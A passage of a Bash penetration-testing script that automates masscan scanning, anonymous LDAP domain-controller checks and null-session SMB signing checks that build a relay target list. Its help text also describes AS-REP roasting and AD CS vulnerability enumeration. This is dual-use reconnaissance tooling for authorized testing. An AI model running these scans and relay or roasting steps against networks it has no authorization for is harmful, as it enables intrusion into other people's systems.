#!/bin/bash

# Pentest Framework - Masscan Scanning Script
# Usage: ./autoscanv3.sh -i iplist.txt -c check|start [-r 1000]
#        ./autoscanv3.sh -i iplist.txt -c start --skip-host-check
#        ./autoscanv3.sh --mass-result mass-result.txt
#        ./autoscanv3.sh -i iplist.txt -c start --resume

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Keep the original invocation so the resume hint can be printed verbatim
ORIGINAL_ARGS=("$@")

# Default values
RATE=1000
IP_FILE=""
COMMAND=""
LDAP_USERNAME=""
LDAP_PASSWORD=""
LDAP_DOMAIN=""
# If true: skip ldapdomaindump and bloodhound (user declined re-entry or validation never succeeded)
LDAP_SKIP_DOWNSTREAM_LDAP_OPS=false
KERBEROS_IMPL=false

# New behaviour flags
SKIP_HOST_CHECK=false          # --skip-host-check
MASS_RESULT_INPUT=""           # --mass-result <file>
MASS_RESULT_FILE="mass-result.txt"
RESUME_MODE="ask"              # ask | auto (--resume) | fresh (--fresh)
MSF_PROJECT=""                 # --project <name> (Metasploit workspace)
MSF_SKIP=false                 # --no-msf
MSF_WORKSPACE_READY=false      # true once the workspace really exists

# Groups whose members are treated as high privileged (matched case-insensitively)
HIGH_PRIV_GROUPS=(
    "Domain Admins"
    "Enterprise Admins"
    "Schema Admins"
    "Administrators"
    "Account Operators"
    "Backup Operators"
    "Server Operators"
    "Print Operators"
    "DnsAdmins"
    "Group Policy Creator Owners"
    "Key Admins"
    "Enterprise Key Admins"
    "Cert Publishers"
    "Domain Controllers"
    "Read-only Domain Controllers"
    "Enterprise Read-only Domain Controllers"
)

# Resume / interrupt state
STATE_FILE=".autoscan-state"
INTERRUPT_ACTION=""            # "" | retry | skip | abort
IN_INTERRUPT_HANDLER=false
LAST_INTERRUPT_TS=-100
CURRENT_STAGE=""
CURRENT_STAGE_LABEL=""

# Port list (transferred from scan.config file)
PORTS="20,21,22,23,25,53,67,68,69,80,81,82,88,110,111,119,123,135,137,139,143,156,161,162,179,194,389,427,443,445,464,465,554,557,587,593,623,631,636,993,995,1000,1001,1433,1434,1443,1521,1522,1529,1720,1723,2021,2022,2049,3000,3268,3269,3306,3389,4022,4444,4848,5000,5060,5061,5062,5432,5555,5900,5985,5986,6000,6001,6002,6379,6380,6443,6667,7443,8000,8008,8020,8040,8042,8080,8081,8082,8083,8090,8181,8443,8444,8888,9000,9001,9080,9200,9443,9999,10000,10443,11211,27017"
echo -e "${CYAN}Port list loaded from script:${NC} $PORTS"

# Browser-reachable ports (every port here gets a proto://ip[:port] URL file)
declare -A WEB_PORTS
# --- HTTP ---
WEB_PORTS[80]="http"
WEB_PORTS[81]="http"
WEB_PORTS[82]="http"
WEB_PORTS[631]="http"
WEB_PORTS[3000]="http"
WEB_PORTS[4444]="http"
WEB_PORTS[5000]="http"
WEB_PORTS[5555]="http"
WEB_PORTS[8000]="http"
WEB_PORTS[8008]="http"
WEB_PORTS[8020]="http"
WEB_PORTS[8040]="http"
WEB_PORTS[8042]="http"
WEB_PORTS[8080]="http"
WEB_PORTS[8081]="http"
WEB_PORTS[8082]="http"
WEB_PORTS[8083]="http"
WEB_PORTS[8090]="http"
WEB_PORTS[8888]="http"
WEB_PORTS[9000]="http"
WEB_PORTS[9001]="http"
WEB_PORTS[9080]="http"
WEB_PORTS[9200]="http"
WEB_PORTS[9999]="http"
# --- HTTPS ---
WEB_PORTS[443]="https"
WEB_PORTS[4848]="https"
WEB_PORTS[6443]="https"
WEB_PORTS[7443]="https"
WEB_PORTS[8181]="https"
WEB_PORTS[8443]="https"
WEB_PORTS[8444]="https"
WEB_PORTS[9443]="https"
WEB_PORTS[10000]="https"
WEB_PORTS[10443]="https"

# Help message
show_help() {
    echo -e "${BOLD}${WHITE}Usage:${NC} $0 -i <ip_file> -c <command> [-r <rate>]"
    echo ""
    echo -e "${BOLD}${YELLOW}Parameters:${NC}"
    echo -e "  ${GREEN}-i, --input${NC}    IP list file (required unless --mass-result is used)"
    echo -e "  ${GREEN}-c, --command${NC}  Command: check (access test) or start (full scan)"
    echo -e "  ${GREEN}-r, --rate${NC}     Scan rate (default: 1000)"
    echo -e "  ${GREEN}-u, --username${NC} LDAP username (optional)"
    echo -e "  ${GREEN}-p, --password${NC} LDAP password (optional)"
    echo -e "  ${GREEN}-d, --domain${NC}   LDAP domain name (optional)"
    echo -e "  ${GREEN}-ki, --kerberos-implementation${NC}  Automate Kerberos config (hosts/resolv/krb5) after scan (optional)"
    echo -e "  ${GREEN}--skip-host-check${NC}       Skip the host discovery phase, go straight to the full port scan"
    echo -e "  ${GREEN}-m, --mass-result <file>${NC} Reuse an existing masscan output instead of scanning (implies -c start)"
    echo -e "  ${GREEN}--project <name>${NC}        Metasploit workspace/project name (asked interactively if omitted)"
    echo -e "  ${GREEN}--no-msf${NC}                Skip the Metasploit database check and workspace creation"
    echo -e "  ${GREEN}--resume${NC}                Resume the previous run without asking"
    echo -e "  ${GREEN}--fresh${NC}                 Ignore any saved progress and start over"
    echo -e "  ${GREEN}-h, --help${NC}     Show this help message"
    echo ""
    echo -e "${BOLD}${YELLOW}Commands:${NC}"
    echo -e "  ${CYAN}check${NC}          Only performs access test (host discovery)"
    echo -e "  ${CYAN}start${NC}          Performs full port scan and saves results"
    echo ""
    echo -e "${BOLD}${YELLOW}Resume / Ctrl+C:${NC}"
    echo -e "  Progress is tracked per step in ${WHITE}${STATE_FILE}${NC}. Ctrl+C never kills the tool immediately:"
    echo -e "  you are asked whether to ${GREEN}retry${NC} the current step, ${GREEN}skip${NC} it, or ${GREEN}save & quit${NC}."
    echo -e "  A saved run is continued with ${WHITE}--resume${NC} (masscan itself resumes from its paused.conf)."
    echo ""
    echo -e "${BOLD}${YELLOW}Config:${NC}"
    echo -e "  Port list is defined within the script (${PURPLE}expanded TCP set${NC}: 100+ ports — web, mail/SMTP-IMAP-POP3,"
    echo -e "    AD/LDAP/GC/Kerberos, DBs, SMB/RDP/VNC, SIP/RTSP, WinRM, printers, Redis/Mongo/Elastic, alt HTTP/HTTPS; ${YELLOW}TCP only${NC}, no UDP)"
    echo -e "  ${PURPLE}DC verify:${NC} After scan, hosts in p389 are checked via anonymous LDAP root DSE (AD capability OIDs);"
    echo -e "    verified DCs replace p389.txt; full LDAP port list kept in p389-ldap-candidates.txt"
    echo -e "    With ${GREEN}-d domain${NC}, DNS SRV _ldap._tcp.dc._msdcs is shown as reference"
    echo -e "  ${PURPLE}Web URLs:${NC} every browser-reachable port gets p<port>-<proto>.txt with the port appended"
    echo -e "    (e.g. p8080-http.txt -> http://1.2.3.4:8080); only 80/http and 443/https are written without a port"
    echo -e "  ${PURPLE}SMB signing:${NC} hosts with SMB signing not required -> smb-signing-disabled-devices.txt (nxc, nmap fallback)"
    echo -e "  ${PURPLE}Up hosts:${NC} every host answering on any port -> up-ips.txt"
    echo -e "  ${PURPLE}User lists:${NC} ldapdomdump JSON -> sam-names.txt and high-priv-accounts.txt"
    echo -e "  ${PURPLE}AS-REP:${NC} sam-names.txt is roasted without a password -> kerberos/as-rep-roast.txt"
    echo -e "  ${PURPLE}AD CS:${NC} certipy-ad find -vulnerable -> certipy/"
    echo -e "  ${PURPLE}Metasploit:${NC} db_status is checked and a workspace is created from the project name"
    echo ""
    echo -e "${BOLD}${YELLOW}Kerberos Implementation (-ki):${NC}"
    echo -e "  Automates /etc/hosts, /etc/resolv.conf, and /etc/krb5.conf configuration."
    echo -e "  Uses DC IPs from p389.txt (verified DCs) or falls back to the input IP list."
    echo -e "  Prompts for domain name (e.g., corp.local) and builds realm (CORP.LOCAL) automatically."
    echo -e "  Creates .bak backups of all modified system files."
    echo ""
    echo -e "${BOLD}${YELLOW}Requirements:${NC}"
    echo -e "  - ${BLUE}masscan${NC} (for port scanning)"
    echo -e "  - ${BLUE}ldapsearch${NC} / ${BLUE}ldapwhoami${NC} (${BLUE}ldap-utils${NC}) for DC verification and credential checks"
    echo -e "  - ${BLUE}nxc${NC} (netexec) or ${BLUE}nmap${NC} for the SMB signing check"
    echo -e "  - ${BLUE}python3${NC} or ${BLUE}jq${NC} to parse ldapdomaindump JSON (user lists)"
    echo -e "  - ${BLUE}certipy-ad${NC} (optional) for AD CS enumeration"
    echo -e "  - ${BLUE}msfconsole${NC} / ${BLUE}msfdb${NC} (optional) for the Metasploit workspace"
    echo ""
    echo -e "${BOLD}${YELLOW}Examples:${NC}"
    echo -e "  $0 -i iplist.txt -c check"
    echo -e "  $0 -i iplist.txt -c start -r 2000"
    echo -e "  $0 -i iplist.txt -c start --skip-host-check"
    echo -e "  $0 --mass-result old-mass-result.txt -u user -p pass -d corp.local"
    echo -e "  $0 -i iplist.txt -c start --resume"
    echo -e "  $0 -i iplist.txt -c start -ki -d corp.local"
}

# Process parameters
while [[ $# -gt 0 ]]; do
    case $1 in
        -i|--input)
            IP_FILE="$2"
            shift 2
            ;;
        -c|--command)
            COMMAND="$2"
            shift 2
            ;;
        -r|--rate)
            RATE="$2"
            shift 2
            ;;
        -u|--username)
            LDAP_USERNAME="$2"
            shift 2
            ;;
        -p|--password)
            LDAP_PASSWORD="$2"
            shift 2
            ;;
        -d|--domain)
            LDAP_DOMAIN="$2"
            shift 2
            ;;
        -ki|--kerberos-implementation)
            KERBEROS_IMPL=true
            shift
            ;;
        --skip-host-check)
            SKIP_HOST_CHECK=true
            shift
            ;;
        -m|--mass-result)
            MASS_RESULT_INPUT="$2"
            shift 2
            ;;
        --project)
            MSF_PROJECT="$2"
            shift 2
            ;;
        --no-msf)
            MSF_SKIP=true
            shift
            ;;
        --resume)
            RESUME_MODE="auto"
            shift
            ;;
        --fresh)
            RESUME_MODE="fresh"
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            echo -e "${RED}Unknown parameter: $1${NC}"
            show_help
            exit 1
            ;;
    esac
done

# Parameter validation
if [[ -n "$MASS_RESULT_INPUT" && -z "$COMMAND" ]]; then
    # A supplied mass-result means "act as if the scan already ran"
    COMMAND="start"
fi

if [[ -z "$IP_FILE" && -z "$MASS_RESULT_INPUT" ]]; then
    echo -e "${RED}Error: IP file not specified!${NC}"
    show_help
    exit 1
fi

if [[ -z "$COMMAND" ]]; then
    echo -e "${RED}Error: Command not specified!${NC}"
    show_help
    exit 1
fi

if [[ "$COMMAND" != "check" && "$COMMAND" != "start" ]]; then
    echo -e "${RED}Error: Invalid command! Use only 'check' or 'start'.${NC}"
    show_help
    exit 1
fi

# Check if IP file exists
if [[ -n "$IP_FILE" && ! -f "$IP_FILE" ]]; then
    echo -e "${RED}Error: IP file not found: $IP_FILE${NC}"
    exit 1
fi

if [[ -z "$IP_FILE" && -z "$MASS_RESULT_INPUT" ]]; then
    echo -e "${RED}Error: no IP file and no --mass-result given.${NC}"
    exit 1
fi

if [[ -n "$MASS_RESULT_INPUT" && ! -f "$MASS_RESULT_INPUT" ]]; then
    echo -e "${RED}Error: mass-result file not found: $MASS_RESULT_INPUT${NC}"
    exit 1
fi

if [[ "$COMMAND" == "check" && -n "$MASS_RESULT_INPUT" ]]; then
    echo -e "${YELLOW}--mass-result has no effect with 'check'; use 'start' to process it.${NC}"
fi

# =====================================================================
#  RESUME STATE
# =====================================================================

# True when a controlling terminal can actually be opened (prompts are possible)
tty_available() {
    { true < /dev/tty; } 2>/dev/null
}

# A fresh run must not pick up a masscan pause left behind by an older run
reset_run_artifacts() {
    rm -f "paused.conf" "paused-discovery.conf" "paused-detailed.conf"
}

state_write_header() {
    {
        echo "# autoscanv3 run state"
        echo "IP_FILE=${IP_FILE}"
        echo "COMMAND=${COMMAND}"
        echo "STARTED=$(date '+%Y-%m-%d %H:%M:%S')"
    } > "$STATE_FILE"
}

stage_is_done() {
    [[ -f "$STATE_FILE" ]] || return 1
    grep -Fxq "DONE:$1" "$STATE_FILE" 2>/dev/null && return 0
    grep -Fxq "SKIPPED:$1" "$STATE_FILE" 2>/dev/null && return 0
    return 1
}

mark_stage_done() {
    stage_is_done "$1" || echo "DONE:$1" >> "$STATE_FILE"
}

mark_stage_skipped() {
    stage_is_done "$1" || echo "SKIPPED:$1" >> "$STATE_FILE"
}

state_summary() {
    [[ -f "$STATE_FILE" ]] || return 0
    local prev_cmd prev_file prev_started
    prev_cmd=$(grep -m1 '^COMMAND=' "$STATE_FILE" | cut -d= -f2-)
    prev_file=$(grep -m1 '^IP_FILE=' "$STATE_FILE" | cut -d= -f2-)
    prev_started=$(grep -m1 '^STARTED=' "$STATE_FILE" | cut -d= -f2-)
    echo -e "${WHITE}  Started:${NC} ${prev_started}"
    echo -e "${WHITE}  Command:${NC} ${prev_cmd}    ${WHITE}IP file:${NC} ${prev_file:-<none>}"
    local line
    while IFS= read -r line; do
        case "$line" in
            DONE:*)    echo -e "    ${GREEN}✔${NC} ${line#DONE:}" ;;
            SKIPPED:*) echo -e "    ${YELLOW}⏭${NC} ${line#SKIPPED:} (skipped)" ;;
        esac
    done < "$STATE_FILE"
}

init_state() {
    if [[ ! -f "$STATE_FILE" ]]; then
        reset_run_artifacts
        state_write_header
        return 0
    fi

    if [[ "$RESUME_MODE" == "fresh" ]]; then
        echo -e "${YELLOW}--fresh given: discarding saved progress.${NC}"
        reset_run_artifacts
        state_write_header
        return 0
    fi

    echo ""
    echo -e "${BOLD}${PURPLE}=== PREVIOUS RUN FOUND ===${NC}"
    state_summary
    echo ""

    if [[ "$RESUME_MODE" == "auto" ]]; then
        echo -e "${GREEN}--resume given: continuing where the previous run left off.${NC}"
        return 0
    fi

    if ! tty_available; then
        echo -e "${YELLOW}No terminal available — continuing from saved progress.${NC}"
        return 0
    fi

    local yn
    while true; do
        read -r -p "Continue from where you left off? [y/n]: " yn < /dev/tty
        case "$yn" in
            y|Y|"")
                echo -e "${GREEN}Resuming previous run.${NC}"
                return 0
                ;;
            n|N)
                echo -e "${YELLOW}Starting a fresh run (saved progress discarded).${NC}"
                reset_run_artifacts
                state_write_header
                return 0
                ;;
            *)
                echo -e "${YELLOW}Please enter y or n.${NC}"
                ;;
        esac
    done
}

# =====================================================================
#  INTERRUPT HANDLING (Ctrl+C never kills the tool outright)
# =====================================================================

# Use after every long running command:  not_interrupted || return 130
not_interrupted() {
    [[ -z "$INTERRUPT_ACTION" ]]
}

# masscan drops a paused.conf when it is interrupted — keep it per scan phase so
# the right one can be handed back to "masscan --resume" later
stash_masscan_pause() {
    [[ -f "paused.conf" ]] || return 0
    case "$CURRENT_STAGE" in
        hostdiscovery) mv -f "paused.conf" "paused-discovery.conf" ;;
        masscan)       mv -f "paused.conf" "paused-detailed.conf" ;;
    esac
}

on_interrupt() {
    # Repeated Ctrl+C while the menu is up must not stack prompts
    if [[ "$IN_INTERRUPT_HANDLER" == "true" ]]; then
        echo ""
        echo -e "${YELLOW}Still waiting for your answer above (r / s / q)...${NC}"
        return
    fi

    # Ctrl+C spam right after a decision: reuse the decision, don't re-ask
    if [[ -n "$INTERRUPT_ACTION" ]] && (( SECONDS - LAST_INTERRUPT_TS < 3 )); then
        echo ""
        echo -e "${YELLOW}Already handling the previous interrupt (${INTERRUPT_ACTION})...${NC}"
        return
    fi

    IN_INTERRUPT_HANDLER=true
    stash_masscan_pause
    echo ""
    echo -e "${RED}⚠️  Interrupt (Ctrl+C) received — the tool is NOT closing.${NC}"
    if [[ -n "$CURRENT_STAGE_LABEL" ]]; then
        echo -e "${YELLOW}Current step:${NC} ${WHITE}${CURRENT_STAGE_LABEL}${NC}"
    fi

    if ! tty_available; then
        echo -e "${YELLOW}No terminal available for a prompt — saving progress and exiting.${NC}"
        INTERRUPT_ACTION="abort"
        IN_INTERRUPT_HANDLER=false
        LAST_INTERRUPT_TS=$SECONDS
        print_resume_hint
        exit 130
    fi

    local ans read_rc
    while true; do
        echo -e "${BOLD}${WHITE}What do you want to do?${NC}"
        echo -e "  ${GREEN}r${NC}) Retry this step (default) — masscan continues from its paused state"
        echo -e "  ${GREEN}s${NC}) Skip this step and continue with the next one"
        echo -e "  ${GREEN}q${NC}) Save progress and quit (continue later with --resume)"

        ans=""
        read -r -p "Choice [r/s/q]: " ans < /dev/tty
        read_rc=$?

        if (( read_rc > 128 )); then
            # Another Ctrl+C landed on the prompt itself — just ask again
            echo ""
            echo -e "${YELLOW}Interrupt during the prompt — the tool is still running.${NC}"
            continue
        fi
        if (( read_rc != 0 )); then
            echo ""
            echo -e "${YELLOW}Input stream closed — saving progress and exiting.${NC}"
            INTERRUPT_ACTION="abort"
            break
        fi

        case "$ans" in
            r|R|"") INTERRUPT_ACTION="retry"; echo -e "${CYAN}Retrying current step...${NC}"; break ;;
            s|S)    INTERRUPT_ACTION="skip";  echo -e "${CYAN}Skipping current step...${NC}"; break ;;
            q|Q)    INTERRUPT_ACTION="abort"; break ;;
            *)      echo -e "${YELLOW}Please enter r, s or q.${NC}" ;;
        esac
    done

    IN_INTERRUPT_HANDLER=false
    LAST_INTERRUPT_TS=$SECONDS

    if [[ "$INTERRUPT_ACTION" == "abort" ]]; then
        [[ -n "$CURRENT_STAGE" ]] && echo -e "${YELLOW}Step '${CURRENT_STAGE}' left unfinished; it will run again on resume.${NC}"
        print_resume_hint
        exit 130
    fi
}

print_resume_hint() {
    echo ""
    echo -e "${CYAN}Progress saved to ${WHITE}${STATE_FILE}${NC}"
    echo -e "${CYAN}Continue later with:${NC} ${WHITE}$0 ${ORIGINAL_ARGS[*]} --resume${NC}"
}

on_terminate() {
    echo ""
    echo -e "${RED}Terminated (SIGTERM).${NC}"
    print_resume_hint
    exit 143
}

trap on_interrupt SIGINT
trap on_terminate SIGTERM

# Run one resumable step.  Usage: run_stage <key> <label> <function> [args...]
run_stage() {
    local key=$1 label=$2
    shift 2

    if stage_is_done "$key"; then
        echo -e "${CYAN}⏩ [${label}] already completed in a previous run — skipping${NC}"
        return 0
    fi

    CURRENT_STAGE="$key"
    CURRENT_STAGE_LABEL="$label"

    local rc
    while true; do
        INTERRUPT_ACTION=""
        "$@"
        rc=$?

        case "$INTERRUPT_ACTION" in
            retry)
                echo -e "${YELLOW}↻ Restarting step: ${label}${NC}"
                continue
                ;;
            skip)
                echo -e "${YELLOW}⏭  Step skipped: ${label}${NC}"
                mark_stage_skipped "$key"
                CURRENT_STAGE=""; CURRENT_STAGE_LABEL=""
                INTERRUPT_ACTION=""
                return 0
                ;;
        esac

        # Only a clean run counts as completed; a failed step is retried on resume
        if [[ $rc -eq 0 ]]; then
            mark_stage_done "$key"
        else
            echo -e "${YELLOW}⚠  Step '${label}' returned ${rc} — it will run again on --resume${NC}"
        fi
        CURRENT_STAGE=""; CURRENT_STAGE_LABEL=""
        return $rc
    done
}

# =====================================================================
#  HELPERS
# =====================================================================

# Print proto://ip[:port] for every IP in a file (80/http and 443/https stay bare)
emit_web_urls() {
    local port=$1 proto=$2 src=$3
    if [[ ("$proto" == "http" && "$port" == "80") || ("$proto" == "https" && "$port" == "443") ]]; then
        sed "s#^#${proto}://#" "$src"
    else
        sed "s#^#${proto}://#; s#\$#:${port}#" "$src"
    fi
}

ip_to_int() {
    local IFS='.'
    local a b c d
    read -r a b c d <<< "$1"
    echo $(( (10#${a:-0} << 24) + (10#${b:-0} << 16) + (10#${c:-0} << 8) + 10#${d:-0} ))
}

# How many addresses a target list really covers: CIDR blocks and ranges are expanded,
# so the access rate is measured against what masscan actually probes.
count_target_ips() {
    local file=$1
    [[ -f "$file" ]] || { echo 0; return 0; }

    local line bits start end base last total=0
    while IFS= read -r line || [[ -n "$line" ]]; do
        line="${line%%#*}"
        line="${line//[[:space:]]/}"
        [[ -z "$line" ]] && continue

        if [[ "$line" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$ ]]; then
            # a.b.c.d/N
            bits=10#${line#*/}
            if (( bits <= 32 )); then
                total=$(( total + (1 << (32 - bits)) ))
            fi
        elif [[ "$line" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}-([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            # a.b.c.d-e.f.g.h
            start=$(ip_to_int "${line%%-*}")
            end=$(ip_to_int "${line##*-}")
            (( end >= start )) && total=$(( total + end - start + 1 ))
        elif [[ "$line" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}-[0-9]{1,3}$ ]]; then
            # a.b.c.d-e  (last octet shorthand)
            base="${line%%-*}"
            last="${line##*-}"
            start=$(ip_to_int "$base")
            end=$(ip_to_int "${base%.*}.${last}")
            (( end >= start )) && total=$(( total + end - start + 1 ))
        else
            # single IP, hostname or IPv6 entry
            total=$(( total + 1 ))
        fi
    done < "$file"

    echo "$total"
}

# Every host that answered on any port, from both scan phases -> up-ips.txt
update_up_ips() {
    echo -e "${BOLD}${BLUE}=== ACTIVE HOST LIST (up-ips.txt) ===${NC}"

    local tmp
    tmp=$(mktemp)
    [[ -f "up-ips.txt" ]] && cat "up-ips.txt" >> "$tmp"
    if [[ -f "host-discovery.txt" ]]; then
        grep "Discovered open port" "host-discovery.txt" 2>/dev/null | awk '{print $6}' >> "$tmp"
    fi
    if [[ -f "$MASS_RESULT_FILE" ]]; then
        grep "Discovered open port" "$MASS_RESULT_FILE" 2>/dev/null | awk '{print $6}' >> "$tmp"
    fi

    grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' "$tmp" 2>/dev/null | sort -uV > "up-ips.txt"
    rm -f "$tmp"

    if [[ -s "up-ips.txt" ]]; then
        local up_count
        up_count=$(wc -l < "up-ips.txt")
        echo -e "${GREEN}✅ ${up_count} active host(s) -> up-ips.txt${NC}"
    else
        echo -e "${YELLOW}No active hosts recorded yet (up-ips.txt is empty).${NC}"
        rm -f "up-ips.txt"
    fi
}

# Host Discovery function
host_discovery() {
    echo -e "${BOLD}${BLUE}=== HOST DISCOVERY PHASE ===${NC}"
    echo -e "${YELLOW}Detecting active hosts...${NC}"

    # Common ports for host discovery
    DISCOVERY_PORTS="80,443,22,21,25,53,110,143,993,995,3389,5900,8080,8443"
    local paused="paused-discovery.conf"

    # Host discovery scan (resume masscan itself if a previous run was interrupted)
    if [[ -f "$paused" ]]; then
        echo -e "${CYAN}Resuming interrupted masscan host discovery (${paused})...${NC}"
        sudo masscan --resume "$paused" >> host-discovery.txt 2>/dev/null
    else
        sudo masscan -p "$DISCOVERY_PORTS" --rate="$RATE" -iL "$IP_FILE" > host-discovery.txt 2>/dev/null
    fi

    if [[ -f "paused.conf" ]]; then
        mv -f "paused.conf" "$paused"
    elif not_interrupted; then
        # Only a scan that ran to completion clears the saved pause state
        rm -f "$paused"
    fi

    not_interrupted || return 130

    # Check if any hosts are active
    if [[ -f "host-discovery.txt" && -s "host-discovery.txt" ]]; then
        active_count=$(grep "Discovered open port" host-discovery.txt | cut -d " " -f 6 | sort -u | wc -l)
        echo -e "${GREEN}✅ $active_count active hosts found${NC}"

        # Access status report
        echo ""
        echo -e "${BOLD}${PURPLE}=== ACCESS STATUS REPORT ===${NC}"
        local entry_count total_ips access_rate
        entry_count=$(grep -cve '^[[:space:]]*$' -e '^[[:space:]]*#' "$IP_FILE")
        total_ips=$(count_target_ips "$IP_FILE")
        echo -e "${WHITE}Target entries:${NC}      $entry_count (IP / CIDR / range lines)"
        echo -e "${WHITE}Addresses in scope:${NC}  $total_ips"
        echo -e "${WHITE}Active Hosts:${NC}        $active_count"
        if [[ $total_ips -gt 0 ]]; then
            access_rate=$(awk -v a="$active_count" -v t="$total_ips" 'BEGIN{printf "%.2f", (a*100)/t}')
            echo -e "${WHITE}Access Rate:${NC}         ${GREEN}%${access_rate}${NC}"
        fi
        echo ""

        return 0
    else
        echo -e "${RED}❌ No active hosts found!${NC}"
        echo -e "${YELLOW}Check your IP list and network connection${NC}"
        return 1
    fi
}

# Query LDAP root DSE; return 0 if this host is an Active Directory Domain Controller (not e.g. AD LDS-only)
rootdse_confirms_ad_dc() {
    local ip=$1
    local scheme=$2
    local out
    out=$(LDAPTLS_REQCERT=never ldapsearch -o nettimeout=5 -o ldif-wrap=no -x -H "${scheme}://${ip}" -s base -b "" supportedCapabilities domainControllerFunctionality dsaServiceName 2>/dev/null) || return 1
    if echo "$out" | grep -q 'domainControllerFunctionality:'; then
        return 0
    fi
    if echo "$out" | grep -qF '1.2.840.113556.1.4.800' && echo "$out" | grep -q 'dsaServiceName:.*NTDS Settings'; then
        return 0
    fi
    return 1
}

ldap_ip_has_ldaps() {
    local ip=$1
    [[ -f "p636.txt" && -s "p636.txt" ]] && grep -Fxq "$ip" "p636.txt"
}

verify_ip_is_domain_controller() {
    local ip=$1
    if rootdse_confirms_ad_dc "$ip" "ldap"; then
        return 0
    fi
    if ldap_ip_has_ldaps "$ip" && rootdse_confirms_ad_dc "$ip" "ldaps"; then
        return 0
    fi
    return 1
}

# Keep p389-ldap-candidates.txt (389/tcp); rewrite p389.txt to AD-verified DCs only when possible
filter_verified_domain_controllers() {
    echo -e "${BOLD}${BLUE}=== DOMAIN CONTROLLER VERIFICATION (LDAP root DSE) ===${NC}"

    if [[ ! -f "p389.txt" || ! -s "p389.txt" ]]; then
        echo -e "${YELLOW}No LDAP (389) hosts to verify.${NC}"
        return 0
    fi

    if ! command -v ldapsearch &> /dev/null; then
        echo -e "${YELLOW}ldapsearch not installed (e.g. apt install ldap-utils). Skipping DC verification.${NC}"
        return 0
    fi

    cp -f "p389.txt" "p389-ldap-candidates.txt"

    local tmp
    tmp=$(mktemp)
    local ip
    while IFS= read -r ip; do
        [[ -z "$ip" ]] && continue
        not_interrupted || { rm -f "$tmp"; return 130; }
        if verify_ip_is_domain_controller "$ip"; then
            echo -e "  ${WHITE}${ip}${NC} ${GREEN}-> verified Active Directory DC${NC}"
            echo "$ip" >> "$tmp"
        else
            echo -e "  ${WHITE}${ip}${NC} ${YELLOW}-> not verified as AD DC (or anonymous root DSE unavailable)${NC}"
        fi
    done < "p389-ldap-candidates.txt"

    not_interrupted || { rm -f "$tmp"; return 130; }

    if [[ -s "$tmp" ]]; then
        sort -uV "$tmp" > "p389.txt"
        rm -f "$tmp"
        local n
        n=$(wc -l < "p389.txt")
        echo -e "${GREEN}Using ${n} verified DC IP(s) in p389.txt (all 389/tcp candidates: p389-ldap-candidates.txt)${NC}"
    else
        rm -f "$tmp"
        cp -f "p389-ldap-candidates.txt" "p389.txt"
        echo -e "${YELLOW}No host passed AD root DSE check; p389.txt left as all LDAP port candidates.${NC}"
        echo -e "${CYAN}If DCs block anonymous binds, downstream LDAP tools may still work with credentials.${NC}"
    fi

    if [[ -n "$LDAP_DOMAIN" ]]; then
        echo -e "${BOLD}${PURPLE}=== DNS DC SRV (reference): _ldap._tcp.dc._msdcs.${LDAP_DOMAIN} ===${NC}"
        if command -v dig &> /dev/null; then
            dig +noall +answer SRV "_ldap._tcp.dc._msdcs.${LDAP_DOMAIN}" 2>/dev/null || true
        elif command -v host &> /dev/null; then
            host -t SRV "_ldap._tcp.dc._msdcs.${LDAP_DOMAIN}" 2>/dev/null || true
        else
            echo -e "${YELLOW}Install dig or host to resolve DC SRV records.${NC}"
        fi
    fi
}

# SMB signing check -> smb-signing-disabled-devices.txt (nxc primary, nmap fallback)
smb_signing_check() {
    echo ""
    echo -e "${BOLD}${PURPLE}=== SMB SIGNING CHECK ===${NC}"

    local out="smb-signing-disabled-devices.txt"
    local target_file=""

    if [[ -f "p445.txt" && -s "p445.txt" ]]; then
        target_file="p445.txt"
    elif [[ -f "up-ips.txt" && -s "up-ips.txt" ]]; then
        target_file="up-ips.txt"
        echo -e "${YELLOW}No p445.txt — falling back to up-ips.txt as target list.${NC}"
    else
        echo -e "${YELLOW}No SMB targets found (p445.txt / up-ips.txt missing). Skipping SMB signing check.${NC}"
        return 0
    fi

    local target_count
    target_count=$(wc -l < "$target_file")
    echo -e "${CYAN}Checking ${target_count} host(s) from ${target_file} (null session)...${NC}"

    # --- Primary: nxc (netexec) ---
    if command -v nxc &> /dev/null; then
        echo -e "${YELLOW}Running nxc SMB signing enumeration...${NC}"
        # Signing status comes from the SMB negotiate banner, so this runs with a null
        # session on purpose: no failed logins, no lockout risk from unvalidated creds
        local nxc_args=(smb "$target_file" --gen-relay-list "$out" -u '' -p '')

        nxc "${nxc_args[@]}" > "nxc-smb-signing.log" 2>&1
        not_interrupted || return 130

        if [[ -s "$out" ]]; then
            sort -uV "$out" -o "$out"
            local n
            n=$(wc -l < "$out")
            echo -e "${GREEN}✅ nxc: ${n} host(s) with SMB signing disabled/not required -> ${out}${NC}"
            echo -e "${CYAN}Raw nxc output: nxc-smb-signing.log${NC}"
            return 0
        fi

        echo -e "${YELLOW}nxc returned no signing-disabled hosts (see nxc-smb-signing.log). Trying nmap fallback...${NC}"
        rm -f "$out"
    else
        echo -e "${YELLOW}nxc (netexec) not installed. Trying nmap fallback...${NC}"
    fi

    # --- Fallback: nmap smb2-security-mode ---
    if ! command -v nmap &> /dev/null; then
        echo -e "${RED}❌ Neither nxc nor nmap is installed. Cannot check SMB signing.${NC}"
        return 0
    fi

    echo -e "${YELLOW}Running nmap smb2-security-mode...${NC}"
    nmap -Pn -n -p445 --open --script smb2-security-mode -iL "$target_file" -oN "nmap-smb-signing.txt" > /dev/null 2>&1
    not_interrupted || return 130

    if [[ ! -f "nmap-smb-signing.txt" ]]; then
        echo -e "${RED}❌ nmap produced no output.${NC}"
        return 0
    fi

    awk '
        /^Nmap scan report for/ { ip=$NF; gsub(/[()]/, "", ip) }
        /Message signing enabled but not required|Message signing disabled/ {
            if (ip != "") { print ip; ip="" }
        }
    ' "nmap-smb-signing.txt" | sort -uV > "$out"

    if [[ -s "$out" ]]; then
        local n
        n=$(wc -l < "$out")
